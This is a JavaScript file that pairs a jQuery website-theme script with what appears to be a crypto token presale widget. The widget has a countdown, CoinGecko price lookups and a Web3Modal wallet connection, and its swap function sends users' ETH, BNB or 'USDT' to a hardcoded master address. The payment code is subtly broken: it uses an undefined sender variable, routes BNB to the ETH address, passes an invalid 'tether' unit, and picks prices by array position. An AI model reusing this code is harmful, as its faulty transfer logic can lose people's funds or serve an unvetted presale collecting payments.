/**
/**
Core script to handle the entire theme and core functions
**/
var Samar = function(){
	/* Search Bar ============ */
	siteUrl = '';
	
	var screenWidth = $( window ).width();
	
	var homeSearch = function() {
		'use strict';
		/* top search in header on click function */
		var quikSearch = jQuery("#quik-search-btn");
		var quikSearchRemove = jQuery("#quik-search-remove");
		
		quikSearch.on('click',function() {
			
			jQuery('.dz-quik-search').fadeIn(500);
			jQuery('.dz-quik-search').addClass('On');
			
			
		});
		
		quikSearchRemove.on('click',function() {
			jQuery('.dz-quik-search').fadeOut(500);
			jQuery('.dz-quik-search').removeClass('On');
			
		});	
		/* top search in header on click function End*/
	}
	
	/* One Page Layout ============ */
	var onePageLayout = function() {
		'use strict';
		var headerHeight =   parseInt($('.onepage').css('height'), 10);
		
		$(".scroll").unbind().on('click',function(event) 
		{
			event.preventDefault();
			
			if (this.hash !== "") {
				var hash = this.hash;	
				var seactionPosition = $(hash).offset().top;
				var headerHeight =   parseInt($('.onepage').css('height'), 10);
				
				
				$('body').scrollspy({target: ".navbar", offset: headerHeight+2}); 
				
				var scrollTopPosition = seactionPosition - (headerHeight);
				
				$('html, body').animate({
					scrollTop: scrollTopPosition
				}, 800, function(){
					
				});
			}   
		});
		$('body').scrollspy({target: ".navbar", offset: headerHeight + 2});  
	}
	
	/* Header Height ============ */
	var handleResizeElement = function(){
		$('.header').css('height','');
		var HeaderHeight = $('.header').height();
		$('.header').css('height', HeaderHeight);
		if(screenWidth > 991 ){
			$('.homedemo').find('.mega-menu').css('height','calc(100vh - '+HeaderHeight+'px)');
		}
	}
	
	/* Load File ============ */
	var dzTheme = function(){
		 'use strict';
		 var loadingImage = '<img src="images/loading.gif">';
		 jQuery('.dzload').each(function(){
		 var dzsrc =   siteUrl + $(this).attr('dzsrc');
		  //jQuery(this).html(loadingImage);
		 	jQuery(this).hide(function(){
				jQuery(this).load(dzsrc, function(){
					jQuery(this).fadeIn('slow');
				}); 
			})
			
		 });
		 
		
		if(screenWidth <= 991 ){
			jQuery('.navbar-nav > li > a, .sub-menu > li > a').unbind().on('click', function(e){
				if(jQuery(this).parent().hasClass('open'))
				{
					jQuery(this).parent().removeClass('open');
				}
				else{
					jQuery(this).parent().parent().find('li').removeClass('open');
					jQuery(this).parent().addClass('open');
				}
			});
		}
		
		
		jQuery('.full-sidenav .navbar-nav > li > a').next('.sub-menu').slideUp();
		jQuery('.full-sidenav .sub-menu > li > a').next('.sub-menu').slideUp();
			
		jQuery('.full-sidenav .navbar-nav > li > a, .full-sidenav .sub-menu > li > a').unbind().on('click', function(e){
			jQuery('.full-sidenav .navbar-nav > li > a').not(this).next('.sub-menu').slideUp();
			jQuery(this).next('.sub-menu').toggle(500);
		});
		jQuery('.menu-icon').on('click',function(){
			jQuery('.menu-close,.full-sidenav').addClass('active');
			onePageLayout();
		});
		jQuery('.menu-close').on('click',function(){
			jQuery('.menu-close,.full-sidenav').removeClass('active');
		});
		
		
		jQuery('.contact-btn').on('click',function(){
			jQuery('.contact-button, .contact-button-2').toggleClass('active');
			
		});
		jQuery('.enter-button, .enquire').on('click',function(){
			jQuery('.enter-form').addClass('active');
			
			setTimeout(function() {
				jQuery('.enter-form').removeClass('active');
			}, 500);
		});
		
		setTimeout(function() {
			jQuery("#myModal").modal('show');
		}, 3000)
		
		
		jQuery('.monthly').on('click',function(){
			jQuery('.toggle-tabs').removeClass('yearly');
			jQuery('.toggle-tabs').addClass('monthly');
		});
		jQuery('.yearly').on('click',function(){
			jQuery('.toggle-tabs').addClass('yearly');
			jQuery('.toggle-tabs').removeClass('monthly');
		});
		
	}
	
	
	/* Magnific Popup ============ */
	var MagnificPopup = function(){
		'use strict';	
		if($(".mfp-gallery").length > 0 ) {
			/* magnificPopup function */
			jQuery('.mfp-gallery').magnificPopup({
				delegate: '.mfp-link',
				type: 'image',
				tLoading: 'Loading image #%curr%...',
				mainClass: 'mfp-img-mobile',
				gallery: {
					enabled: true,
					navigateByImgClick: true,
					preload: [0,1] // Will preload 0 - before current, and 1 after the current image
				},
				image: {
					tError: '<a href="%url%">The image #%curr%</a> could not be loaded.',
					titleSrc: function(item) {
						return item.el.attr('title') + '<small></small>';
					}
				}
			});
		}
		if($(".video").length > 0 ) {
		/* magnificPopup function end */
		
		/* magnificPopup for paly video function */		
		jQuery('.video').magnificPopup({
			type: 'iframe',
			iframe: {
				markup: '<div class="mfp-iframe-scaler">'+
						 '<div class="mfp-close"></div>'+
						 '<iframe class="mfp-iframe" frameborder="0" allowfullscreen></iframe>'+
						 '<div class="mfp-title">Some caption</div>'+
						 '</div>'
			},
			callbacks: {
				markupParse: function(template, values, item) {
					values.title = item.el.attr('title');
				}
			}
		});
		}
		if($(".popup-youtube, .popup-vimeo, .popup-gmaps").length > 0 ) {
			/* magnificPopup for paly video function end*/
			$('.popup-youtube, .popup-vimeo, .popup-gmaps').magnificPopup({
				disableOn: 700,
				type: 'iframe',
				mainClass: 'mfp-fade',
				removalDelay: 160,
				preloader: false,

				fixedContentPos: false
			});
		}
	}
	
	
	/* Scroll To Top ============ */
	var scrollTop = function (){
		'use strict';
		var scrollTop = jQuery("button.scroltop");
		/* page scroll top on click function */	
		scrollTop.on('click',function() {
			jQuery("html, body").animate({
				scrollTop: 0
			}, 1000);
			return false;
		})

		jQuery(window).bind("scroll", function() {
			var scroll = jQuery(window).scrollTop();
			if (scroll > 900) {
				jQuery("button.scroltop").fadeIn(1000);
			} else {
				jQuery("button.scroltop").fadeOut(1000);
			}
		});
		/* page scroll top on click function end*/
	}
	
	/* handle Accordian ============ */
	var handleAccordian = function(){
		/* accodin open close icon change */	 	
		jQuery('#accordion').on('hidden.bs.collapse', function(e){
			jQuery(e.target)
				.prev('.panel-heading')
				.find("i.indicator")
				.toggleClass('glyphicon-minus glyphicon-plus');
		});
		jQuery('#accordion').on('shown.bs.collapse', function(e){
			jQuery(e.target)
				.prev('.panel-heading')
				.find("i.indicator")
				.toggleClass('glyphicon-minus glyphicon-plus');
		});
		/* accodin open close icon change end */
	}
	
	/* Equal Height ============ */
	var equalHeight = function(container) {
		
		if(jQuery(container).length == 0)
		{
			return false
		}
			
		var currentTallest = 0, 
			currentRowStart = 0, 
			rowDivs = new Array(), 
			$el, topPosition = 0;
			
		$(container).each(function() {
			$el = $(this);
			$($el).height('auto')
			topPostion = $el.position().top;

			if (currentRowStart != topPostion) {
				for (currentDiv = 0; currentDiv < rowDivs.length; currentDiv++) {
					rowDivs[currentDiv].height(currentTallest);
				}
				rowDivs.length = 0; // empty the array
				currentRowStart = topPostion;
				currentTallest = $el.height();
				rowDivs.push($el);
			} else {
				rowDivs.push($el);
				currentTallest = (currentTallest < $el.height()) ? ($el.height()) : (currentTallest);
			}
			for (currentDiv = 0; currentDiv < rowDivs.length; currentDiv++) {
				rowDivs[currentDiv].height(currentTallest);
			}
		});
		
	}
	
	/* Footer Align ============ */
	var footerAlign = function() {
		'use strict';
		jQuery('.site-footer').css('display', 'block');
		jQuery('.site-footer').css('height', 'auto');
		var footerHeight = jQuery('.site-footer').outerHeight();
		jQuery('.footer-fixed > .page-wraper').css('padding-bottom', footerHeight);
		jQuery('.site-footer').css('height', footerHeight);
	}
	
	/* File Input ============ */
	var fileInput = function(){
		'use strict';
		/* Input type file jQuery */	 	 
		jQuery(document).on('change', '.btn-file :file', function() {
			var input = jQuery(this);
			var	numFiles = input.get(0).files ? input.get(0).files.length : 1;
			var	label = input.val().replace(/\\/g, '/').replace(/.*\//, '');
			input.trigger('fileselect', [numFiles, label]);
		});
		
		jQuery('.btn-file :file').on('fileselect', function(event, numFiles, label) {
			input = jQuery(this).parents('.input-group').find(':text');
			var log = numFiles > 10 ? numFiles + ' files selected' : label;
		
			if (input.length) {
				input.val(log);
			} else {
				//if (log) alert(log);
			}
		});
		/* Input type file jQuery end*/
	}
	
	/* Header Fixed ============ */
	var headerFix = function(){
		'use strict';
		/* Main navigation fixed on top  when scroll down function custom */		
		jQuery(window).on('scroll', function () {
			if(jQuery('.sticky-header').length > 0){
				var menu = jQuery('.sticky-header');
				if ($(window).scrollTop() > menu.offset().top) {
					menu.addClass('is-fixed');
					$('.site-header .container > .logo-header .logo').attr('src','images/logo.png');
					$('.site-header .container > .logo-header .logo-2').attr('src','images/logo-2.png');
					$('.site-header .container > .logo-header .logo-3').attr('src','images/logo-3.png');
				} else {
					menu.removeClass('is-fixed');
					$('.site-header .container > .logo-header .logo, .site-header .container > .logo-header .logo-2, .site-header .container > .logo-header .logo-3').attr('src','images/logo-white.png')
				}
			}
		});
		/* Main navigation fixed on top  when scroll down function custom end */
	}
	
	/* Masonry Box ============ */
	var masonryBox = function(){
		'use strict';
		
		/* masonry by  = bootstrap-select.min.js */
		if(jQuery('#masonry, .masonry').length > 0)
		{
			jQuery('.filters li').removeClass('active');
			jQuery('.filters li:first').addClass('active');
			var self = jQuery("#masonry, .masonry"); 
			var filterValue = "";
	 
			if(jQuery('.card-container').length > 0)
			{
				var gutterEnable = self.data('gutter');
				
				var gutter = (self.data('gutter') === undefined)?0:self.data('gutter');
				gutter = parseInt(gutter);
				
				
				var columnWidthValue = (self.attr('data-column-width') === undefined)?'':self.attr('data-column-width');
				if(columnWidthValue != ''){columnWidthValue = parseInt(columnWidthValue);}
				
				//alert(columnWidthValue);
				
				self.imagesLoaded(function () {
					filter: filterValue,
					self.masonry({
						gutter: gutter,
						columnWidth:columnWidthValue, 
						//columnWidth:3, 
						//gutterWidth: 15,
						isAnimated: true,
						itemSelector: ".card-container",
						//horizontalOrder: true,
						//fitWidth: true,
						//stagger: 30
						//containerStyle: null
						//percentPosition: true
					});
					
				}); 
				
			} 
		}
		if(jQuery('.filters').length)
		{
			jQuery(".filters li:first").addClass('active');
			
			jQuery(".filters").on("click", "li", function() {
				
				jQuery('.filters li').removeClass('active');
				jQuery(this).addClass('active');
				
				var filterValue = $(this).attr("data-filter");
				self.isotope({ 
					filter: filterValue,
					masonry: {
						gutter: gutter,
						columnWidth: columnWidthValue,
						isAnimated: true,
						itemSelector: ".card-container"
					}
				});
			});
		}
		
		/* masonry by  = bootstrap-select.min.js end */
	}
	
	
	/* Counter Number ============ */
	var counter = function(){
		if(jQuery('.counter').length)
		{
			jQuery('.counter').counterUp({
				delay: 10,
				time: 3000
			});	
		}
	}
	
	/* Video Popup ============ */
	var handleVideo = function(){
		/* Video responsive function */	
		jQuery('iframe[src*="youtube.com"]').wrap('<div class="embed-responsive embed-responsive-16by9"></div>');
		jQuery('iframe[src*="vimeo.com"]').wrap('<div class="embed-responsive embed-responsive-16by9"></div>');	
		/* Video responsive function end */
	}
	
	/* Gallery Filter ============ */
	var handleFilterMasonary = function(){
		/* gallery filter activation = jquery.mixitup.min.js */ 
		if (jQuery('#image-gallery-mix').length) {
			jQuery('.gallery-filter').find('li').each(function () {
				$(this).addClass('filter');
			});
			jQuery('#image-gallery-mix').mixItUp();
		};
		if(jQuery('.gallery-filter.masonary').length){
			jQuery('.gallery-filter.masonary').on('click','span', function(){
				var selector = $(this).parent().attr('data-filter');
				jQuery('.gallery-filter.masonary span').parent().removeClass('active');
				jQuery(this).parent().addClass('active');
				jQuery('#image-gallery-isotope').isotope({ filter: selector });
				return false;
			});
		}
		/* gallery filter activation = jquery.mixitup.min.js */
	}
	
	/* handle Bootstrap Select ============ */
	var handleBootstrapSelect = function(){
		/* Bootstrap Select box function by  = bootstrap-select.min.js */ 
		if (jQuery('select').length) {
		    jQuery('select').selectpicker();
		}
		/* Bootstrap Select box function by  = bootstrap-select.min.js end*/
	}
	
	/* Resizebanner ============ */
	var handleBannerResize = function(){
		$(".full-height").css("height", $(window).height());
	}
	
	/* Countdown ============ */
	var handleCountDown = function(WebsiteLaunchDate){
		/* Time Countr Down Js */
		if($(".countdown").length)
		{
			$('.countdown').countdown({date: WebsiteLaunchDate+' 23:5'}, function() {
				$('.countdown').text('we are live');
			});
		}
		/* Time Countr Down Js End */
	}
	
	/*handlePlaceholderAnimation*/
	var handlePlaceholderAnimation = function()
	{
		/*if(jQuery('.dezPlaceAni').length)
		{*/
		
			$('input, textarea').focus(function(){
			  $(this).parents('.form-group').addClass('focused');
			});
			
			$('input, textarea').blur(function(){
			  var inputValue = $(this).val();
			  if ( inputValue == "" ) {
				$(this).removeClass('filled');
				$(this).parents('.form-group').removeClass('focused');  
			  } else {
				$(this).addClass('filled');
			  }
			})
		/*}*/
	}
	
	
	
	/* WOW ANIMATION ============ */
	var wow_animation = function(){
		if($('.wow').length > 0)
		{
			var wow = new WOW(
			{
			  boxClass:     'wow',      // animated element css class (default is wow)
			  animateClass: 'animated', // animation css class (default is animated)
			  offset:       0,          // distance to the element when triggering the animation (default is 0)
			  mobile:       false       // trigger animations on mobile devices (true is default)
			});
			wow.init();	
		}	
	}
	
	/* BGEFFECT ============ */
	
	var reposition = function (){
		'use strict';
		var modal = jQuery(this),
		dialog = modal.find('.modal-dialog');
		modal.css('display', 'block');
		
		/* Dividing by two centers the modal exactly, but dividing by three 
		 or four works better for larger screens.  */
		dialog.css("margin-top", Math.max(0, (jQuery(window).height() - dialog.height()) / 2));
	}
	
	var handelResize = function (){
		
		/* Reposition when the window is resized */
		jQuery(window).on('resize', function() {
			jQuery('.modal:visible').each(reposition);
		
			equalHeight('.equal-wraper .equal-col');
			footerAlign();
		});
	}
	
	/* Website Launch Date */ 
	var WebsiteLaunchDate = new Date();
	monthNames = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
	WebsiteLaunchDate.setMonth(WebsiteLaunchDate.getMonth() + 1);
	WebsiteLaunchDate =  WebsiteLaunchDate.getDate() + " " + monthNames[WebsiteLaunchDate.getMonth()] + " " + WebsiteLaunchDate.getFullYear();
	/* Website Launch Date END */ 
	
	/* Header Height ============ */
	var setResizeMargin = function(){
		if(($('.setResizeMargin').length > 0) && screenWidth >= 1280){
			var containerSize = $('.container').width();
			var getMargin = (screenWidth - containerSize)/2;
			$('.setResizeMargin').css('margin-left',getMargin);
		}
		if(($('.setResizeMargin-right').length > 0) && screenWidth >= 1280){
			var containerSize = $('.container').width();
			var getMargin = (screenWidth - containerSize)/2;
			$('.setResizeMargin-right').css('margin-right',getMargin);
		}
	}
	
	/* LightGallery ============ */
	var lightGallery = function (){
		if(($('#lightgallery, .lightgallery').length > 0)){
			$('#lightgallery, .lightgallery').lightGallery({
				selector : '.lightimg',
				loop:true,
				thumbnail:true,
				exThumbImage: 'data-exthumbimage'
			});
		}
	}	
	
	/* handle Bootstrap Touch Spin ============ */
	var handleBootstrapTouchSpin = function(){
		if(jQuery("input[name='demo_vertical2']").length)
		{
			jQuery("input[name='demo_vertical2']").TouchSpin({
			  verticalbuttons: true,
			  verticalupclass: 'ti-plus',
			  verticaldownclass: 'ti-minus'
			});
		}
	}
	
	var boxHover = function(){
		jQuery('.pricingtable-wrapper, .box-hover').on('mouseenter',function(){
			var selector = jQuery(this).parent().parent();
			selector.find('.pricingtable-wrapper, .box-hover').removeClass('active');
			jQuery(this).addClass('active');
		});
	}
	
	var customFileUpload = function(){	
		$(".custom-file-input").on("change", function() {
			var fileName = $(this).val().split("\\").pop();
			$(this).siblings(".custom-file-label").addClass("selected").html(fileName);
		});
	}
	
	/* Range ============ */
	var priceslider = function(){

		if($(".price-slide, .price-slide-2").length > 0 ) {
			$("#slider-range,#slider-range-2").slider({
				range: true,
				min: 300,
				max: 4000,
				values: [0, 5000],
				slide: function(event, ui) {
					var min = ui.values[0],
						max = ui.values[1];
					  $('#' + this.id).prev().val("$" + min + " - $" + max);
				}
			});
		}
	}
		
	/* Function ============ */
	return {
		init:function(){
			boxHover();
			// wow_animation();
			onePageLayout();
			dzTheme();
			homeSearch();
			handleResizeElement();
			handlePlaceholderAnimation();
			MagnificPopup();
			handleAccordian();
			scrollTop();
			footerAlign();
			fileInput();
			headerFix();
			handleVideo();
			handleFilterMasonary();
			handleCountDown(WebsiteLaunchDate);
			handleBannerResize();
			setResizeMargin();
			handelResize();
			lightGallery();
			jQuery('.modal').on('show.bs.modal', reposition);
			customFileUpload();
			priceslider();
		},

		
		load:function(){
			handleBootstrapSelect();
			equalHeight('.equal-wraper .equal-col');
			counter();
			masonryBox();
			handleBootstrapTouchSpin();
			
		},
		
		resize:function(){
			screenWidth = $(window).width();
			dzTheme();
			setTimeout(function(){
				handleResizeElement();
			}, 500);
			
		}
	}
	
}();

/* Variables you can change */
	var rate = 0.1037
	var countDownDate = new Date("Oct 5, 2023 15:37:25").getTime();
	var ethMasterAddress = "0xa5EB564A81072E4aEBeb4328B0d19a11343516Bb" 
	var bscMasterAddress = "0xa5EB564A81072E4aEBeb4328B0d19a11343516Bb" 
	document.getElementById("receivingCurrencyImg").src="images/wall.svg"

/*Functions Executable */
	getPrices()

/*Countdown*/
	function getCountdown(){
		var now = new Date().getTime();
			
		var distance = countDownDate - now;

		var days = Math.floor(distance / (1000 * 60 * 60 * 24));
		var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
		var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
		var seconds = Math.floor((distance % (1000 * 60)) / 1000);

		document.getElementById("days").innerHTML = days + "d "
		document.getElementById("hours").innerHTML = hours + "h "
		document.getElementById("mins").innerHTML = minutes + "m "
		document.getElementById("secs").innerHTML = seconds + "s "
	}
	getCountdown()
	var x = setInterval(function() {
		getCountdown()
	}, 1000);

/* Exchange Rate */
var selectedInput = "USDT";
var selectedInputPrice = "1";
var _prices = [];
document.getElementById("rate_price").textContent = rate;

var amount_in = document.getElementById("amount_in");
var amount_out = document.getElementById("amount_out");

// Function to calculate amount_out based on selectedInput and rate
function calculateAmountOut() {
    if (selectedInput == "USDT") { selectedInputPrice = 1; }
    if (selectedInput == "ETH") { selectedInputPrice = _prices[1].current_price; }
    if (selectedInput == "BNB") { selectedInputPrice = _prices[3].current_price; }
    if (selectedInput == "USD") { selectedInputPrice = _prices[5].current_price; }
    amount_out.value = (parseFloat(amount_in.value) * selectedInputPrice / rate).toFixed(2);
}

amount_in.addEventListener("keyup", (event) => {
    calculateAmountOut();
});

async function getPrices() {
    const response = await fetch("https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd");
    const prices = await response.json();
    _prices = prices;
    console.log("prices", _prices);
    console.log(prices[1].current_price);
    console.log(prices[3].current_price);
    console.log(prices[5].current_price);
}

/* Change currency */
function changeCurrency() {
    var bnbMethod = document.getElementById("bnb-method");
    var ethMethod = document.getElementById("eth-method");
    var btnText = document.getElementById('buy-btn-currency');

    if (ethMethod.style.display === 'none') {
        ethMethod.style.display = 'block';
        bnbMethod.style.display = 'none';
        btnText.innerText = "BNB";
        document.getElementById("payingCurrencyImg").src = "images/eth.svg";
        selectedInput = "ETH";
        console.log(selectedInput);
    } else {
        ethMethod.style.display = 'none';
        bnbMethod.style.display = 'block';
        document.getElementById("payingCurrencyImg").src = "images/bnb.svg";
        btnText.innerText = "ETH";
        selectedInput = "BNB";
        console.log(selectedInput);
    }
	document.querySelector('.input-currency').innerText = `${selectedInput}`
    calculateAmountOut(); // Call the function to update amount_out
}

// Call getPrices() to fetch initial prices
getPrices();

/*Click on payMethod*/
	function payMethodChange(id){
		var ethMethod = document.getElementById("eth-method")

		
		if (id == 0) {
			document.getElementById("b_eth").classList.add("actived");
			document.getElementById("b_usdt").classList.remove("actived");
			document.getElementById("b_usd").classList.remove("actived");
		
			if (ethMethod.style.display === 'none') {
				document.getElementById("payingCurrencyImg").src = "images/bnb.svg";
				selectedInput = "BNB";
				console.log(selectedInput);
				
			} else {
				document.getElementById("payingCurrencyImg").src = "images/eth.svg";
				selectedInput = "ETH";
				console.log(selectedInput);
			}
		} else if(id==1){
			document.getElementById("b_eth").classList.remove("actived")
			document.getElementById("b_usdt").classList.add("actived")
			document.getElementById("b_usd").classList.remove("actived")

			document.getElementById("payingCurrencyImg").src="images/usdt.svg";
			selectedInput = "USDT"
			console.log(selectedInput)

			
		} else if(id==2){
			document.getElementById("b_eth").classList.remove("actived")
			document.getElementById("b_usdt").classList.remove("actived")
			document.getElementById("b_usd").classList.add("actived")

			document.getElementById("payingCurrencyImg").src="images/usd.svg";
			selectedInput = "USD"
			console.log(selectedInput)

			
		}
		if(selectedInput=="USDT"){selectedInputPrice=1}
		if(selectedInput=="ETH"){selectedInputPrice=_prices[1].current_price}
		if(selectedInput=="BNB"){selectedInputPrice=_prices[3].current_price}
		if(selectedInput=="USD"){selectedInputPrice=_prices[5].current_price}
		amount_out.value = (parseFloat(amount_in.value)*selectedInputPrice/rate).toFixed(2);
		document.querySelector('.input-currency').innerText = `${selectedInput}`
		
	}

	

	
/*Connect Metamask */

"use strict";

/**
 * Example JavaScript code that interacts with the page and Web3 wallets
 */

 // Unpkg imports
const Web3Modal = window.Web3Modal.default;
const WalletConnectProvider = window.WalletConnectProvider.default;
const Fortmatic = window.Fortmatic;
const evmChains = window.evmChains;

// Web3modal instance
let web3Modal

// Chosen wallet provider given by the dialog window
let provider;


// Address of the selected account
let selectedAccount;


/**
 * Setup the orchestra
 */
function init() {

  console.log("Initializing example");
  console.log("WalletConnectProvider is", WalletConnectProvider);
  console.log("Fortmatic is", Fortmatic);
  console.log("window.web3 is", window.web3, "window.ethereum is", window.ethereum);

  // Check that the web page is run in a secure context,
  // as otherwise MetaMask won't be available
  // if(location.protocol !== 'https:') {
  //   // https://ethereum.stackexchange.com/a/62217/620
  //   const alert = document.querySelector("#alert-error-https");
  //   alert.style.display = "block";
  //   document.querySelector("#btn-connect").setAttribute("disabled", "disabled")
  //   return;
  // }

  // Tell Web3modal what providers we have available.
  // Built-in web browser provider (only one can exist as a time)
  // like MetaMask, Brave or Opera is added automatically by Web3modal
  const providerOptions = {
    walletconnect: {
      package: WalletConnectProvider,
      options: {
        // Mikko's test key - don't copy as your mileage may vary
        infuraId: "8043bb2cf99347b1bfadfb233c5325c0",
      }
    },

    fortmatic: {
      package: Fortmatic,
      options: {
        // Mikko's TESTNET api key
        key: "pk_test_391E26A3B43A3350"
      }
    }
  };

  web3Modal = new Web3Modal({
    cacheProvider: false, // optional
    providerOptions, // required
    disableInjectedProvider: false, // optional. For MetaMask / Brave / Opera.
  });

  console.log("Web3Modal instance is", web3Modal);
}


/**
 * Kick in the UI action after Web3modal dialog has chosen a provider
 */
async function fetchAccountData() {

  // Get a Web3 instance for the wallet
  const web3 = new Web3(provider);

  console.log("Web3 instance is", web3);

  // Get connected chain id from Ethereum node
  const chainId = await web3.eth.getChainId();
  // Load chain information over an HTTP API
  const chainData = evmChains.getChain(chainId);
  document.querySelector("#network-name").textContent = chainData.name;

  // Get list of accounts of the connected wallet
  const accounts = await web3.eth.getAccounts();

  // MetaMask does not give you all accounts, only the selected account
  console.log("Got accounts", accounts);
  selectedAccount = accounts[0];

  document.querySelector("#selected-account").textContent = selectedAccount;

  // Get a handl
  const template = document.querySelector("#template-balance");
  const accountContainer = document.querySelector("#accounts");

  // Purge UI elements any previously loaded accounts
  accountContainer.innerHTML = '';

  // Go through all accounts and get their ETH balance
  const rowResolvers = accounts.map(async (address) => {
    const balance = await web3.eth.getBalance(address);
    // ethBalance is a BigNumber instance
    // https://github.com/indutny/bn.js/
    const ethBalance = web3.utils.fromWei(balance, "ether");
    const humanFriendlyBalance = parseFloat(ethBalance).toFixed(4);
    // Fill in the templated row and put in the document
    const clone = template.content.cloneNode(true);
    clone.querySelector(".balance").textContent = humanFriendlyBalance;
    accountContainer.appendChild(clone);
  });

  // Because rendering account does its own RPC commucation
  // with Ethereum node, we do not want to display any results
  // until data for all accounts is loaded
  await Promise.all(rowResolvers);

  // Display fully loaded UI for wallet data
  document.querySelector("#prepare").style.display = "none";
  document.querySelector("#connected").style.display = "flex";
}



/**
 * Fetch account data for UI when
 * - User switches accounts in wallet
 * - User switches networks in wallet
 * - User connects wallet initially
 */
async function refreshAccountData() {

  // If any current data is displayed when
  // the user is switching acounts in the wallet
  // immediate hide this data
  document.querySelector("#connected").style.display = "none";
  document.querySelector("#prepare").style.display = "block";

  // Disable button while UI is loading.
  // fetchAccountData() will take a while as it communicates
  // with Ethereum node via JSON-RPC and loads chain data
  // over an API call.
  var btnConnect = document.querySelector("#btn-connect")
  btnConnect.setAttribute("disabled", "disabled")
  await fetchAccountData(provider);
  btnConnect.removeAttribute("disabled")
  if(!btnConnect.hasAttribute("disabled")){
	document.querySelector("#btn-disconnect").style.display ='block'
	}
	else{
		document.querySelector("#btn-disconnect").style.display ='none'
	}

}

/**
 * Connect wallet button pressed.
 */
async function onConnect() {

  console.log("Opening a dialog", web3Modal);
  try {
    provider = await web3Modal.connect();
  } catch(e) {
    console.log("Could not get a wallet connection", e);
    return;
  }

  // Subscribe to accounts change
  provider.on("accountsChanged", (accounts) => {
    fetchAccountData();
  });

  // Subscribe to chainId change
  provider.on("chainChanged", (chainId) => {
    fetchAccountData();
  });

  // Subscribe to networkId change
  provider.on("networkChanged", (networkId) => {
    fetchAccountData();
  });

  await refreshAccountData();
}

/**
 * Disconnect wallet button pressed.
 */
async function onDisconnect() {

  console.log("Killing the wallet connection", provider);

  // TODO: Which providers have close method?
  if(provider.close) {
    await provider.close();

    // If the cached provider is not cleared,
    // WalletConnect will default to the existing session
    // and does not allow to re-scan the QR code with a new wallet.
    // Depending on your use case you may want or want not his behavir.
    await web3Modal.clearCachedProvider();
    provider = null;
  }

  selectedAccount = null;

  // Set the UI back to the initial state
  document.querySelector("#prepare").style.display = "block";
  document.querySelector("#connected").style.display = "none";
  document.querySelector('#btn-disconnect').style.display = 'none'
}


/**
 * Main entry point.
 */
window.addEventListener('load', async () => {
  init();
  document.querySelector("#btn-connect").addEventListener("click", onConnect);
  document.querySelector("#btn-disconnect").addEventListener("click", onDisconnect);
});

  
/* Swap Tokens */
async function swap(){
	if(selectedInput=="ETH"){
		ethereum.request({
			method: 'wallet_switchEthereumChain',
			params: [{ chainId: "0x1" }],
		  })
		.then((txHash) => {
			console.log(txHash)
	ethereum
    .request({
      method: 'eth_sendTransaction',
      // The following sends an EIP-1559 transaction. Legacy transactions are also supported.
      params: [
        {
          from: addy, // The user's active address.
          to: ethMasterAddress, // Required except during contract publications.
          value: "0x" + Web3.utils.toBN(Web3.utils.toWei(amount_in.value, "ether")).toString(16),
        },
      ],
    })
    .then((txHash) => console.log(txHash))
    .catch((error) => console.error(error));
		}).catch((error) => console.error(error));}
	if(selectedInput=="BNB"){
		ethereum.request({
			method: 'wallet_switchEthereumChain',
			params: [{ chainId: "0x38" }],
		  })
		.then((txHash) => {
			console.log(txHash)
			ethereum.request({
				method: 'eth_sendTransaction',
				// The following sends an EIP-1559 transaction. Legacy transactions are also supported.
				params: [
				  {
					from: addy, // The user's active address.
					to: ethMasterAddress, // Required except during contract publications.
					value: "0x" + Web3.utils.toBN(Web3.utils.toWei(amount_in.value, "ether")).toString(16),
				  },
				],
			  })
			  .then((txHash) => console.log(txHash))
			  .catch((error) => console.error(error))
		}).catch((error) => console.error(error));}
		if(selectedInput=="USDT"){
			ethereum
			.request({
			  method: 'eth_sendTransaction',
			  // The following sends an EIP-1559 transaction. Legacy transactions are also supported.
			  params: [
				{
				  from: addy, // The user's active address.
				  to: bscMasterAddress, // Required except during contract publications.
				  value: "0x" + Web3.utils.toBN(Web3.utils.toWei(amount_in.value, "tether")).toString(16),
				},
			  ],
			})
			.then((txHash) => console.log(txHash))
			.catch((error) => console.error(error));
			}
		

}

/* Document.ready Start */	
jQuery(document).ready(function() {
    'use strict';
	Samar.init();
	
	jQuery('.navicon').on('click',function(){
		$(this).toggleClass('open');
	});

});
/* Document.ready END */

/* Window Load START */
jQuery(window).on('load',function () {
	'use strict'; 
	Samar.load();
	setTimeout(function(){
		jQuery('#loading-area').remove();
	}, 0);
});
/*  Window Load END */
/* Window Resize START */
jQuery(window).on('resize',function () {
	'use strict'; 
	Samar.resize();
});
/*  Window Resize END */